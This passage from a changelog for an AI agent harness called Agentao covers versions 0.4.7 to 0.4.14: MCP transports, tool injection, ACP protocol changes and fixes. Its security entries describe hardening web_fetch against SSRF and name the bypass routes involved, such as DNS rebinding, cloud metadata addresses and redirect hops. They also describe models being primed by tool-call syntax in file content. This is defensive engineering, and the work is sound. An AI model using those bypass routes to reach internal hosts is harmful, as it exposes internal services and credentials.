  a non-converging turn, `runtime_error` (with `error.reason: "llm_error"` and
  the provider's actual message) when the LLM call failed. Note that such a
  turn may have run tools first: `tool_calls` reports how many, and their side
  effects have already landed, so a non-zero exit does **not** imply an
  untouched workspace. (#126)

## [0.4.14] — 2026-07-02

A **feature release** on top of 0.4.13. The headline is MCP transport work —
Streamable HTTP support and finer per-call MCP timeouts — plus a `/thinking`
command, a Jina `web_search` backend, and three provider/sub-agent robustness
fixes.

**Breaking (config behavior):** a bare `url` in `.agentao/mcp.json` now defaults
to the **Streamable HTTP** transport instead of SSE. Legacy SSE endpoints must
add `"type": "sse"`. That is the only break; everything else upgrades in place.

### Added

- **MCP Streamable HTTP transport.** The MCP client now connects over Streamable
  HTTP — the current MCP-spec transport that replaces the deprecated HTTP+SSE
  transport — via the canonical `streamable_http_client`. Transport is selected
  by an optional `type` field (`"stdio"` / `"http"` / `"sse"`, with
  `"streamable-http"` / `"streamable_http"` aliases). An unknown `type`, or a
  transport missing its required key, **fails closed** (`McpTransportConfigError`)
  rather than silently connecting to the wrong protocol. The ACP handshake now
  advertises `mcpCapabilities.http: true` and `session/new` accepts `http` MCP
  entries. CLI: `/mcp add [--http|--sse] <name> <url>`. (#120)
- **Split MCP timeouts.** `timeout` in `mcp.json` now accepts either an int
  (legacy — the connect/startup budget) or `{ "startup": int, "request": int }`.
  `request` bounds each tool call after init (previously unbounded); `startup`
  bounds the whole connect **and** the `initialize()` / `list_tools()` handshake
  for both transports. Backward compatible. (#119)
- **MCP `structuredContent` fallback.** A tool that returns `content: []` plus
  `structuredContent` no longer hands the model an empty string — the structured
  payload is serialized to JSON when there are no content blocks (content blocks
  still win when present). (#119)
- **`/thinking [minimal|low|medium|high|off]`** sets the model's reasoning
  effort (the `reasoning_effort` request field) on the live client's
  `extra_body`; sub-agents launched afterward inherit it, and `off` restores the
  provider default. The active level shows in the status bar. (#113)
- **Jina `web_search` backend + auto fallback chain.** `web_search` adds a
  `jina` backend (keyless; a `JINA_API_KEY` only lifts rate limits) and, in auto
  mode, retreats on *error* through jina → bocha → duckduckgo. An explicit
  `backend=` still pins exactly one backend with no fallback. Each fallback is
  surfaced in the result and logged. (#114)
- **`AGENTAO_WEB_FETCH_ALLOW_CIDRS`** — an opt-in `web_fetch` SSRF allowlist of
  non-globally-routable CIDRs (the escape hatch for hosts behind a fake-IP proxy
  such as Clash/V2Ray). Applied to the initial URL and every redirect hop,
  scoped (allowlisting `198.18.0.0/15` does not also permit `169.254.169.254`),
  and logged at startup. Default empty = fully strict. (#114)

### Changed

- **BREAKING — MCP bare-`url` default flipped to Streamable HTTP.** A server
  entry with a `url` and no `type` connected over SSE before 0.4.14; it now
  connects over Streamable HTTP. Add `"type": "sse"` to keep a legacy SSE
  endpoint. An inferred-HTTP handshake failure prints an actionable "try
  `type: sse`" hint (suppressed for explicit `http`, for auth failures, and for
  non-MCP endpoints). (#120)

### Fixed

- **Sub-agent tool lifecycle events now carry the real `call_id`** (plus
  status / duration / error) end-to-end, so a same-named parallel tool batch
  (e.g. four concurrent `read_file`) can be traced start→finish, and a failed or
  denied sub-agent tool is no longer reported as a hardcoded success. (#112)
- **Streamed tool calls without an `index` field** (emitted by some
  OpenAI-compatible / self-hosted providers) are keyed by synthetic
  stream-stable ids instead of collapsing onto a single `None` key — fixing
  garbled arguments across parallel calls and a finalization crash on streams
  that mix indexed and index-less deltas. (#117)
- **Empty / whitespace tool-call names no longer trigger a catalog-dump priming
  loop.** Weak local models primed by tool-call syntax sitting in file or tool
  content emitted blank-named calls that were answered with the full tool
  catalog, inflating context on every retry; they now get a terse anti-priming
  reply (no catalog) with a hard stop, while a genuine non-empty typo still gets
  the catalog to self-correct. (#118)

---

## [0.4.13] — 2026-06-24

A **feature release** on top of 0.4.12 adding `/goal` long-task continuation,
plus a frontmatter-robustness fix. No public Python-API, schema, or config
break; upgrade in place.

### Added

- **`/goal` — long-task continuation with a time/turn budget.** State an
  objective once and the CLI drives a host-owned continuation loop toward it
  across turns until the agent marks it complete/blocked (via an injected,
  read-only `update_goal` tool) or a time/turn budget trips (one wrap-up turn).
  Subcommands `show`/`budget`/`pause`/`resume`/`edit`/`clear`; flags
  `--for <duration>` / `--turns <n>` / `--unbounded`. State persists to
  `.agentao/goal.json`. Built from existing harness primitives — the harness
  stays goal-agnostic; budgets are pure host-side time/turn accounting (no
  token budgets), and it deliberately does **not** use the plugin
  `Stop`/`force_continue` path. New developer-guide chapter 4.8 documents the
  host-orchestration pattern for other hosts. (#109)

### Fixed

- **Malformed SKILL.md / plugin frontmatter now warns instead of being silently
  dropped.** A frontmatter block that fails to parse surfaces a warning rather
  than being discarded without trace. (#108)

---

## [0.4.12] — 2026-06-19

An **ACP-surface + internal-cleanup** release on top of 0.4.11. The ACP server
gains G4 session/update emissions (permission modes, task plan) and replays
`todo_write` as a plan on `session/load`; the rest is an evidence-backed
optimization pass (packaging slim-down, hot-path token counting, two latent cwd
bugs fixed) plus duplication cleanup. No public Python-API, schema, or config
break; upgrade in place.

### Added

- **ACP G4 — permission modes and the task plan are surfaced as
  `session/update`.** The server now emits the active permission mode and the
  current task plan over `session/update`, and replays a recorded `todo_write`
  as a `plan` update on `session/load`, so a reconnecting client reconstructs
  plan state. (#101, #102)

### Changed

- **Packaging: removed five dead optional extras.** `[pdf]` / `[excel]` /
  `[image]` / `[crypto]` / `[google]` had zero in-tree consumers and dragged
  grpc/protobuf, pandas/numpy, etc. into `[full]` for nothing. They are dropped
  from `[project.optional-dependencies]` and from `[full]`, which now closes
  over `cli + web + i18n + crawl4ai + tokenizer` only (122 → 106 packages in the
  CI freeze baseline). `pip install 'agentao[pdf]'` (etc.) no longer resolves;
  the Gemini path was always OpenAI-compatible and never imported `google-genai`.
  See `docs/design/optimization-opportunities-review.md` (T1.1).
- **Internal consolidations and hot-path tidy-ups (behavior-preserving).**
  `_heuristic_token_count` drops its per-character Python loop for an
  integer-exact vectorized count (T1.2); both compaction predicates share one
  per-iteration token estimate instead of computing it twice (T1.3);
  `factory.resolve_provider_name()` unifies the `LLM_PROVIDER` read across the
  factory / diagnostics / CLI (T2.2); a new `split_subcommand()` /
  `unknown_subcommand()` collapse the duplicated CLI dispatch preamble/footer
  (T2.4); the pure-Python search fallback shares the match-formatting helper
  (T2.6); a new ACP `resolve_session()` backs both `require_active_session` and
  `session/cancel` (T2.1); the `session/update` envelope is centralized in one
  helper (#104); and the replay back-compat comment is regrouped so the live
  `*_replay()` API is no longer mislabeled "remove in 0.5.0" (T1.5).

### Fixed

- **ACP: `session/update` `schema_version` is typed as `int`, not `str`.** (#103)
- **CLI: `.agentao/settings.json` is read *and* written against the resolved
  project root.** Previously both `_load_settings` and `_save_settings` used a
  cwd-relative `Path(".agentao")`, so a CLI launched from a subdirectory
  persisted `mode` to a file the factory never reads. Both now go through
  `replay.config.settings_path()` bound to the agent's frozen
  `working_directory`. (T2.3)
- **Tools: `CodebaseInvestigatorTool` resolves its directory against the session
  `working_directory`.** It used a raw `Path(directory).expanduser()`, bypassing
  the per-session cwd binding the base resolver enforces; it now uses
  `_resolve_directory`, closing a latent ACP per-session-cwd leak. (T2.5)

---

## [0.4.11] — 2026-06-14

### Changed

- **`AGENTAO.md` now drops a leading YAML frontmatter block before injecting
  it into the system prompt.** Previously the file was read verbatim, so a
  frontmatter block carried over from a Cursor rule or another tool's
  instruction file (`---\nname: ...\n---`) leaked into the prompt as literal
  text. `load_project_instructions` now routes the contents through a new
  `agentao.prompts.strip_frontmatter()` helper. Stripping is conservative — it
  only fires when the document genuinely opens with a frontmatter *mapping*
  (opening `---` fence + YAML mapping + closing `---` fence); an absent block,
  malformed YAML, or a stray `---` thematic break wrapping prose is left
  untouched so real instructions are never silently dropped. The disk-read
  path only; a host-injected `project_instructions=` string stays the host's
  responsibility. The ignored-frontmatter case is logged at INFO.

- **Consolidated five copies of the YAML frontmatter parser (internal,
  behavior-preserving).** The private `_parse_yaml_frontmatter` was duplicated
  across `skills/installer.py`, `skills/manager.py`, `agents/manager.py`, and
  `embedding/plugins/resolvers/{agents,skills}.py`, having drifted on value
  coercion, body stripping, and malformed-YAML fallback. All now delegate to a
  single `agentao.frontmatter.parse_frontmatter(content, *, coerce_str=False)`:
  `coerce_str=True` for the skill / plugin loaders (string values), the native
  default for the agent loaders (so `tools: [read_file]` stays a list). The
  shared parser adopts the safest behavior of the five — a malformed or
  non-mapping block degrades to `{}` instead of raising `AttributeError`. (The
  AGENTAO.md `strip_frontmatter` helper stays separate by design: it uses a
  stricter, line-anchored fence match for free-form prose.)

---

## [0.4.10] — 2026-06-14

### Added

- **Host LLM request passthrough: `Agentao(extra_body=...)`.** The LLM request
  kwargs were a closed set, so a host could not reach `reasoning_effort` /
  `top_p` / `seed` / `response_format` or any provider-specific body field
  without subclassing `LLMClient` or monkeypatching — both off the
  `agentao.host` contract. `extra_body` is the SDK-blessed escape hatch, now a
  first-class harness primitive. (#91)
  - Forwarded verbatim to the OpenAI SDK `.create()` body on both the
    non-streaming and streaming paths via a single `_build_request_kwargs()`
    (de-dups the previously closed kwargs dict); omitted when empty so requests
    stay byte-identical.
  - **Keyword-only** on the constructor so it never shifts the legacy
    positional callback args; mutually exclusive with `llm_client=` (a loud
    `ValueError`, not a silent no-op); deep-copied at construction so a host
    mutating a nested value it still holds cannot alter in-flight requests.
  - Sub-agents inherit it via the `_llm_config` snapshot. `reconfigure()`
    preserves it across a model switch with **no auto-recovery latch** — the
    host owns dropping model-specific keys (a stale `reasoning_effort` will 400
    until cleared), unlike the `omit_temperature` / `max_completion_tokens`
    latches that are reset.
  - Logged with recursive credential redaction (exact lower-cased key-name
    match over dict/list/tuple; covers body and header-style names like
    `x-api-key`, `authorization`, `client_secret`) so a benign `*_tokens` key
    is not over-redacted.
  - Env var `LLM_EXTRA_BODY` (JSON object; malformed or valid-but-non-object →
    warn + skip; empty → unset). `extra_headers`, `settings.json`, and a
    `/param` command are deferred (§8).
  - Design: `docs/design/host-llm-extra-params.md` / `.zh.md`.

### Changed

- **Context-window threshold checks anchor to the real Tier-1 prompt-token
  count.** `needs_compression` / `needs_microcompaction` re-encoded the entire
  history through tiktoken twice per turn even though the real `prompt_tokens`
  from the prior API response was already recorded and went unused. The
  threshold estimate now reuses that count for the already-sent prefix and
  locally estimates only the messages appended since. (#90)
  - Behavior note: the Tier-1 count includes system + tool-schema tokens the
    old local estimate omitted, so thresholds now fire on the true prompt
    size — marginally earlier and more accurate.
  - The anchor is invalidated on every history-replace path — full
    compression, microcompaction (previously a latent staleness bug),
    `/sessions resume`, ACP session load, in-loop overflow recovery, manual
    `/compact`, `clear_history`, and model/provider switch — via a single
    `invalidate_token_anchor()` helper that keeps the paired `(count, tokens)`
    invariant. A malformed provider `prompt_tokens` field falls back to the
    full local estimate rather than crashing the threshold path.

### Fixed

- **Context-overflow detection hardened with a provider table + negative
  guard.** `is_context_too_long_error` was a 7-phrase substring matcher with no
  negative guard: it missed overflow errors from xAI / Google / Bedrock /
  OpenRouter / Together / Mistral / llama.cpp / LM Studio / Kimi / Ollama, and
  its fallback phrase "too many tokens" misclassified Bedrock throttling
  (`ThrottlingException: Too many tokens...`) as overflow — triggering a
  destructive history compaction on a transient error. Rewritten as a two-tier
  compiled-regex table: a broadened positive pattern set, plus a negative set
  (throttling / rate limit / 429 / 503) checked first that short-circuits to
  `False`. Adds 22 positive provider cases + 5 guard cases. (#88)
- **Compaction summary now closes with an end-of-summary marker.** The summary
  was opened by the `[Compact Boundary]` system message but had no terminator,
  so the summarizer's "## 9. Next Step" section could read as a live
  instruction and the kept messages after it blurred into the summary. A
  `SUMMARY_END_MARKER` plus a one-line "historical context, resume below, do
  not re-execute completed work" frame gives the block a symmetric open/close
  bracket; on re-summarization the marker and frame are stripped (anchored on
  the `[Conversation Summary]` prefix) so they never accumulate or truncate an
  unrelated message that merely contains the marker substring. (#89)

### Security

- **Resolve-based SSRF guard for `web_fetch`.** The only SSRF defense was the
  `PermissionEngine` string blocklist, matched on the original URL at the
  plan-phase gate — it missed hostnames that *resolve* to private / loopback /
  link-local addresses (DNS rebinding, public names pointed at `127.0.0.1` /
  `169.254.169.254`), alternate IP encodings, and redirect hops into the
  internal network (the client used `follow_redirects=True` with no per-hop
  check); 8 of 13 bypass vectors slipped through. New
  `agentao/security/url_policy.py`: `validate_outbound_url()` resolves the host
  and rejects any non-global address, normalizes the hostname (trailing dot /
  case), rejects local/internal names, single-label hosts and embedded creds,
  and unwraps v4-mapped / 6to4 / NAT64 IPv6 forms; `guarded_get()` drives the
  redirect chase with `follow_redirects=False` and re-validates every hop. Both
  are wired into `WebFetchTool.execute()`; the static blocklist stays as the
  I/O-free first layer (defense in depth). (#92)

---

## [0.4.9] — 2026-06-10

### Added

- **Host tool injection: `Agentao(extra_tools=..., disable_tools=...)`.** Two
  first-class, construction-time kwargs on the embedded-host contract for
  adding, replacing, and hiding tools — replacing post-construction pokes at
  the runtime `agent.tools.register(...)`.
  - `extra_tools` — pre-built `Tool` / `AsyncToolBase` instances, registered as
    the true final pass (after built-in, MCP, and agent tools) so a same-named
    entry overrides a built-in or agent tool. Injected tools inherit the same
    working-directory / filesystem / shell capability binding as built-ins.
    Names using the reserved `mcp_` prefix raise (MCP replacement stays on
    `mcp_manager=` / `extra_mcp_servers=`); duplicates raise.
  - `disable_tools` — a set of built-in tool names to skip registering. A typo
    or unknown name raises at construction (validated against the static
    `BUILTIN_TOOL_NAMES` set) rather than silently no-op'ing. It only skips
    built-in registration — not a global denylist, not a security boundary
    (that stays with the permission engine).
  - `WebSearchTool(backend=..., api_key=...)` — explicit constructor args now
    take precedence over the `BOCHA_API_KEY` env var, so two in-process
    Agentao instances can use different search backends. Pass a configured
    instance via `extra_tools=[...]`.
  - `Tool`, `AsyncToolBase`, `RegistrableTool` are now re-exported from
    `agentao.host` as a stable import path for host tool authors.
  - Design: `docs/design/host-tool-injection.md` / `.zh.md`.

- **Runtime tool injection: `Agentao.add_tool` / `remove_tool`.** The
  post-construction dual of `extra_tools=` / `disable_tools=`, for hosts that
  add or drop a tool between `chat()` / `arun()` calls without rebuilding the
  agent (e.g. long ACP sessions). (#65)
  - `add_tool(tool, *, replace=False)` routes through the same validation +
    capability binding as `extra_tools=` (never a "bare" tool). `replace=False`
    + a name clash raises (stricter than the runtime `register`'s
    warn-and-overwrite); `replace=True` overrides a built-in / agent / extra
    tool with an INFO audit line.
  - `remove_tool(name) -> bool` unregisters via the new
    `ToolRegistry.unregister(name)`; an unknown name returns `False` instead of
    raising. It shrinks the model-visible schema — not a security boundary.
  - Reserved namespaces (`mcp_` prefix, plus the plan-mode `plan_save` /
    `plan_finalize`) are rejected by both `add_tool` (incl. `replace=True`) and
    `remove_tool` — closing the `add_tool(name="plan_save", replace=True)`
    loophole. The plan-name reservation also tightens construction-time
    `extra_tools=`.
  - Visibility: the tool schema is snapshotted once per `chat()` / `arun()`
    call, so changes take effect on the **next** call, never mid-turn.
  - Design: `docs/design/runtime-tool-injection.md` / `.zh.md`.

- **Host tool allowlist: `Agentao(enabled_tools=...)`.** The additive dual of
  `disable_tools=` — declare the minimal tool set to keep instead of
  enumerating everything to drop. Closes two gaps a blocklist can't: it's
  concise for a minimal core, and a built-in added later can't silently leak
  in (not listed → excluded). It also reaches agent-path tools at construction
  time, which `disable_tools` cannot.
  - `enabled_tools=None` (default) keeps today's behavior. Any iterable —
    including the empty set — *enables* the allowlist (`is not None`
    semantics): after registration, every built-in / agent-path tool whose
    name is absent is pruned.
  - Scope is agentao-owned tools only: `extra_tools` (host injected them
    explicitly), MCP (`mcp_*`), and plan-only tools are always kept. Minimize
    MCP at the MCP layer instead.
  - Mutually exclusive with `disable_tools` (passing both raises). Reserved
    names (`mcp_` prefix, plan-only) raise at construction; unknown names raise
    after registration (typo guard against the live registry — sharper than
    `disable_tools` since a bad allowlist name silently excludes a tool).
  - Design: `docs/design/host-tool-allowlist.md` / `.zh.md`.

- **MCP connect-time preflight: fast-fail when a remote `url` is not an MCP
  endpoint.** A misconfigured `url` in `mcp.json` pointing at a plain web page
  (website, login portal, wrong path) used to stall `connect_all()` for the
  full SSE `timeout` (default 60 s) before failing opaquely. `_connect_sse`
  now runs a cheap 5 s HEAD probe (GET fallback on 405/501) and rejects a 2xx
  response advertising a definite non-MCP content type with an actionable
  `NonMcpEndpointError`. Detection is allow-list based (`application/json` /
  `text/event-stream`) and strictly best-effort: missing/empty content type,
  non-2xx status, or any transport error passes through — the real handshake
  stays authoritative. (#71)

- **ACP server startup resume: `agentao --acp --resume [SESSION_ID]`.** The
  ACP server can reattach to a persisted session: a one-shot
  `ResumeDirective` is consumed by the first `session/new`, which hydrates
  and replays the saved history (reusing the `session/load` loader) and
  returns the persisted `sessionId`; later `session/new` calls behave
  normally. The fallback is permissive — empty store, unknown id,
  corrupt/unreadable file, or an already-active id all degrade to a fresh
  session (logged at WARNING) rather than failing the client's first
  `session/new`. Hosts get the same seam via
  `AcpServer(resume_directive=...)`. (#76)

### Changed

- **Split six oversized modules into focused, cohesive units (internal,
  behavior-preserving).** No public API, runtime behavior, or import path
  changed — method/class bodies moved verbatim and every historically
  imported name is re-exported from its original module. (#63)
  - `agent.py`: the ~246-line `Agentao.__init__` is now a short sequence of
    ordered phase helpers (`_validate_construction_args`, `_init_mcp_sources`,
    `_init_session_state`, `_init_replay`, `_wire_tooling`).
  - `cli/diagnostics_cli.py` (862 lines) → a `cli/diagnostics/` package
    (`models` / `loaders` / `collectors` / `render` / `commands`); the old
    module is now a thin re-export shim.
  - `acp/transport.py` (950 lines) → `ACPTransport(_ReplayMixin,
    _InteractionMixin)` plus a shared `_transport_helpers` module.
  - `llm/client.py` (890 → 688 lines): request/response logging moved to a
    `_LoggingMixin` (`agentao/llm/_logging.py`).
  - `acp_client/client.py` (937 → 779 lines): the exception hierarchy moved to
    `acp_client/errors.py`.
  - `plugins/hooks/_dispatcher.py` (756 → 542 lines): the structured-stdout
    parsers moved to a `_OutputParsingMixin` (`_output_parsing.py`).

- **Vision degradation rewrites rejected image turns as `<attachment>` tags.**
  When a model rejects image input, the retry now rewrites the user turn with
  one self-closing `<attachment uri="..." mimetype="..."/>` tag per image
  appended at the end of the message (uri from the image's `_source`, else
  `inline-image-N`; attribute-escaped) instead of the previous bracketed
  prose + bullet list. Canonical format documented as dev-guide appendix A.1
  "Image input and vision degradation" (EN+ZH); the engine enforces no
  size/count caps — hosts must. (#84)

- **docs/ reorganized into an audience-oriented layout.** 11 subdirs + 14
  loose top-level files restructured into seven purpose dirs — `start/`,
  `guides/`, `reference/`, `design/`, `releases/`, `migration/`, `history/` —
  with filenames normalized to kebab-case. The code-coupled `schema/` dir is
  intentionally unchanged (tests read it by hardcoded path). (#80)

### Fixed

- **De-flake the ACP-client nonblocking-serialization subprocess test.**
  `test_prompt_once_server_busy_during_nonblocking_turn`'s final post-cancel
  `prompt_once` used a 5 s budget; under CI contention on the Python 3.12
  runner the real subprocess round-trip occasionally exceeded it
  (`AcpClientError: timeout waiting for session/prompt response`). Bumped to
  the file's existing 10 s "slow round-trip" budget. Test-only; no runtime
  change.

- **Subprocess timeouts now kill the whole process tree (search, plugin
  hooks, shell).** A bare `subprocess.run(timeout=)` signals only the direct
  child, so a grandchild holding the captured pipe (Windows `git`
  credential helpers, a user hook backgrounding a process) hung
  `communicate()` past the timeout — five parallel hangs saturated the tool
  pool and wedged ACP-stdio turns until the client dropped the connection.
  New shared `capabilities/process.run_captured()`: own process
  group/session, explicit stdin handling (`input=` over a pipe, else
  `DEVNULL` so a child can never read the JSON-RPC channel),
  `kill_process_tree()` on timeout (`taskkill /T` on Windows, `killpg(pid)`
  elsewhere — never `getpgid`, which races a zombie child), and
  `errors="replace"` decoding. `search_file_content` and the plugin hook
  dispatcher route through it; `LocalShellExecutor.run` keeps its streaming
  loop but shares `kill_process_tree`. (#73, #74, #75)

- **ACP sessions persist on server shutdown.** When an ACP client stopped an
  agentao server subprocess, chat history was dropped (unlike the CLI, which
  saves on session end). `AcpSessionState.close()` now persists the
  conversation keyed by the ACP `sessionId` (so `session/load` can resume
  it) before cancelling the turn token, and the bundled `acp_client` closes
  the server's stdin first so its read loop reaches the save path before
  SIGTERM/SIGKILL escalation. Shared `persist_agent_session()` helper keeps
  the CLI and ACP teardown paths in one place. (#78)

- **Sub-agent construction no longer crashes on `working_directory`.**
  `AgentToolWrapper._run_sync` built the sub-`Agentao(...)` without
  `working_directory` — required since 0.3.0 — so every sub-agent invocation
  raised `TypeError`. The parent's project root is now threaded through
  (`create_agent_tools` passes `working_directory=self.project_root`), with a
  regression test on the construction kwarg. (#80)

- **Session resume no longer rebinds the persisted model.** A session stores
  only the model *name*, never its provider, so re-applying it onto the
  current process's provider could yield an inconsistent `(provider, model)`
  pair that fails on the next LLM call. Both resume paths (CLI
  `/sessions resume`, ACP `session/load` / startup resume) now keep the
  process-default model; the saved name is still persisted and shown for
  reference. (#81)

- **SKILL.md relative paths resolve against the skill directory.** Skill
  instructions referencing `scripts/foo.py` failed whenever cwd ≠ skill
  directory — the common case, since skills install under
  `~/.agentao/skills/` or `<project>/.agentao/skills/`. Fixed at the
  activation layer so every skill (including third-party) self-heals:
  `activate_skill` and the per-turn skills context now report
  `Skill directory: <abs path>` plus the resolution rule, `scripts/` is
  enumerated alongside `references/`/`assets/` (hidden files and
  `__pycache__` skipped, listings capped with an explicit truncation
  marker), plugin-command entries are exempted (a shared `commands/` folder
  is not a skill directory), and skill paths are resolved to absolute at
  load. The bundled `ocr` example carries PEP 723 inline metadata so
  `uv run` works from any cwd. (#83, #85)

---

## [0.4.8] — 2026-05-30

### Changed

- **ACP `session/set_mode` uses the standard `modeId` field and accepts
  unknown values.** The ACP-standard field is `modeId` (not the pre-existing
  non-standard `mode`), and a `modeId` is a UI/behavioural selector that need
  not be an Agentao permission preset. The handler now reads `modeId`, applies
  a `PermissionEngine` preset **only** on an exact match (`read-only` /
  `workspace-write` / `full-access` / `plan`), and **persists + echoes** any
  other value without changing permission posture — so a client mode like
  DeepChat's `code` / `ask` round-trips instead of being rejected with
  `-32602`. A non-preset `modeId` needs no permission engine; a recognized
  preset still does. `AcpSessionSetModeRequest.modeId` /
  `AcpSessionSetModeResponse.modeId` are now open strings (snapshot
  `docs/schema/host.acp.v1.json` bumped). The permission-axis split and
  `availableModes` / `currentModeId` + `current_mode_update` remain deferred
  to their own design.
- **ACP `initialize` advertises extensions through `_meta`, not a top-level
  `extensions` array.** The ACP-standard `initialize` response carries only
  `protocolVersion` / `agentCapabilities` / `agentInfo` / `authMethods`;
  extension data belongs under `_meta`. Agentao now returns its
  `_agentao.cn/ask_user` advertisement under
  `_meta["_agentao.cn/extensions"]` (vendor-namespaced so it never collides
  with another extension's `_meta` payload) instead of the non-standard
  top-level `extensions: [...]`. `AcpInitializeResponse` drops the
  `extensions` field for an open `_meta` object (`AcpInitializeMeta`); the
  schema snapshot (`docs/schema/host.acp.v1.json`) is bumped. Agentao's own
  `acp_client` never read `extensions`, so no client code changes; a
  schema-following host that still sends a top-level `extensions` is now
  rejected (`extra="forbid"`).

### Fixed

- **Silence jieba's `SyntaxWarning` noise on first Chinese-text recall.**
  jieba 0.42.1 (its latest and last PyPI release) uses non-raw regex
  literals that Python 3.12 flags as `SyntaxWarning: invalid escape
  sequence` when its modules first compile — surfacing in the terminal the
  first time CJK memory retrieval imports it. Routed every jieba import in
  `memory/retriever.py` through a single `_import_jieba()` helper that mutes
  `SyntaxWarning` at the import chokepoint (jieba pulls in `finalseg` at
  module top, so one wrap covers all three warnings). No behavior change;
  other warnings are untouched.
- **Robust home-directory resolution when `$HOME` is unset.** Added
  `agentao.paths.user_home()` — `Path.home()` with a fallback to
  `$HOME` / `USERPROFILE` and finally the system temp dir, so an
  environment that can't resolve a home directory (stripped service
  accounts, some container/CI sandboxes, headless ACP launches) no longer
  raises `RuntimeError`. The fallback is a *private, per-user* temp
  subdirectory created `0700` and validated for ownership/permissions
  (a pre-existing world/group-accessible path is abandoned for a fresh
  `mkdtemp`), so a co-tenant on a shared host can't plant config/plugins
  at a predictable path for us to load. `user_root()` now routes through
  it, and the
  scattered direct `Path.home()` call sites (memory dictionary/skills
  paths, the skills registry, plugin discovery, the sandbox config, the
  log-handler fallback, the CLI history file) go through `user_home()` /
  `user_root()` — fixing the import-time crash risk where module-level
  `~/.agentao` constants resolved `Path.home()` at import. Subsystem
  constructors still take explicit roots (unchanged from the Issue 5
  no-implicit-fallback contract); this only hardens the path helpers
  themselves.

### Added

- **ACP model/provider switching that keeps secrets off the wire.** Added the
  ACP-standard `session/set_config_option` handler for `configId="model"`: a
  client switches model/provider by sending a `provider/model` *identifier*
  (e.g. `"openai/gpt-4o"`), and credentials are resolved **server-side**
  through a host-injectable `provider_resolver` — they never travel on the
  ACP wire (nor into `agentao.log`). The value is split on the *first* `/`
  (so `huggingface/meta-llama/Llama-3` → provider `huggingface`, model
  `meta-llama/Llama-3`); a bare value with no `/` is a model-only switch that
  keeps the current provider. Two mechanisms reject any credential-bearing
  field (`apiKey` / `baseUrl` / `_meta`): a handler whitelist (only
  `sessionId`/`configId`/`value` are read) **and** the
  `AcpSessionSetConfigOptionRequest` schema (`extra="forbid"`). The default
  resolver accepts **only** the configured `LLM_PROVIDER` (`{PROVIDER}_API_KEY`
  / `_BASE_URL`); any other provider id → `INVALID_REQUEST`. It never scans
  the environment for a provider list — multi-provider switching requires a
  host-injected resolver paired with a host-injected catalog
  (`AcpServer(provider_resolver=..., model_catalog=...)`). `session/new` and
  `session/load` now advertise the `model` `configOptions` (default catalog is
  the single current `provider/model`); a successful switch returns the
  refreshed `configOptions` in its **response only** — no
  `config_option_update` notification. Also added the vendor
  `_agentao.cn/set_model` (`{sessionId, model}`, free-form, secret-free,
  model-only) for "type any model" UX a `select` can't express; it shares the
  core `agent.set_model()` path. The existing `session/set_model` and
  `session/list_models` are kept unchanged as one-release compatibility
  endpoints. Host ACP schema gains `AcpSessionSetConfigOptionRequest/Response`,
  `AcpConfigOption`, `AcpConfigOptionChoice`, `AcpAgentaoSetModelRequest/Response`,
  and `configOptions` on the `session/new` / `session/load` responses
  (snapshot `docs/schema/host.acp.v1.json` bumped).
- **Multimodal image input through the turn.** `chat()` / `arun()` accept
  an optional `images=[{"data": <base64>, "mimeType": <type>}, ...]`. When
  present, the user turn is emitted as an OpenAI-style multimodal content
  list (a `text` part plus one `image_url` part per image with an inline
  `data:` URL) instead of a plain string; text-only turns are unchanged.
  The LLM request logger summarizes multimodal parts (`text (N chars)`,
  `image_url (N chars, inline base64)`) rather than dumping the raw base64
  blob into `agentao.log`. Image data arrives as standard content blocks,
  so this is decoupled from any specific ACP client.
- **ACP image input.** `session/prompt` now accepts ACP `image` content
  blocks (`{"type":"image","data":<base64>,"mimeType":...}`), rendering
  them into the multimodal turn via `agent.chat(images=...)`; text and
  `resource_link` blocks are unchanged and `audio`/embedded `resource`
  still raise `INVALID_PARAMS`. The `initialize` handshake now advertises
  `promptCapabilities.image: true`, and the host ACP schema gains
  `AcpImageContentBlock` (snapshot `docs/schema/host.acp.v1.json` bumped).
  The untrusted payload is validated at the boundary: `mimeType` must be
  `image/*`, `data` must be valid base64 within a 20 MB per-image cap, and
  a prompt may carry at most 16 images — each violation is a clean
  `-32602 INVALID_PARAMS`. The CLI `/image` command enforces the same
  size/count caps, and `/clear` · `/new` now drop any staged images so
  they cannot leak into the next session. `/image` re-validates the bytes
  it actually read (not just the earlier `stat()`), closing a TOCTOU gap
  where a file truncated or grown between the size check and the read could
  stage an empty or oversized block. The image wire carries only inline
  `{data, mimeType}`: any other key (`uri`, `path`, `apiKey`, `baseUrl`,
  `_meta`, …) is rejected both at the schema layer (`extra="forbid"`) and in
  the runtime `_parse_prompt` parser (which works on raw dicts and so needs
  its own allowlist), so the handler can never be coaxed into dereferencing a
  host path or smuggling a secret.
  Saving a session whose first user message is image+text now derives its
  title from the text part instead of persisting an empty title.
- **Structured `ask_user`.** The `ask_user` tool now accepts optional
  `header` / `options` / `multiple` / `allow_custom` hints alongside the
  free-form `question`, so the model can offer a choice list while still
  letting the user type a custom answer. The hints flow through the
  `Transport.ask_user` contract to every transport: the CLI renders a
  numbered menu and accepts a number, comma-separated numbers (when
  `multiple`), or custom text — re-prompting when `allow_custom` is false
  and the entry isn't one of the options; the ACP transport forwards them on
  `_agentao.cn/ask_user` (host-agnostic plain-string options, not
  option-cards) and the host ACP schema's `AcpAskUserParams` gains the
  matching fields (snapshot `docs/schema/host.acp.v1.json` bumped); the
  replay recorder captures them. The reply stays a single string (a client
  joins `multiple` selections itself). Backward-compatible: a plain
  `ask_user(question)` keeps its original wire/recording shape, and legacy
  1-arg `Callable[[str], str]` callbacks (the deprecated `ask_user_callback`
  constructor arg, or an `SdkTransport(ask_user=...)` callback) keep working
  — the structured kwargs are forwarded only to callbacks whose signature
  accepts them, dropped otherwise.

## [0.4.7] — 2026-05-17

### Added

- **`agentao doctor` and `agentao config validate` — diagnostics CLI** (#45).
  Two new non-interactive subcommands that aggregate or validate the
  harness's existing signals without instantiating an agent. `doctor`
  covers the `.env` provider check (API-key *presence*, never the value),
  `settings.json`, permissions, MCP, replay, ACP schema export, project +
  user memory stores, plugin diagnostics, and optional-dep probes.
  `config validate` is the narrower companion that only checks
  user-editable config (no plugin section). Output contract is
  `{"ok": bool, "sections": {...}, "findings": [...]}`; errors exit `1`,
  warnings keep exit `0`. `--json` is the contract surface for CI/hosts,
  human-readable is the default. Both are **read-only** (probing an
  absent `memory.db` reports `"absent"` instead of bootstrapping it) and
  reject unknown flags with exit `2`. Implementation in
  `agentao/cli/diagnostics_cli.py`; documented under
  `developer-guide/{en,zh}/cli/12-non-interactive.md`; design rationale in
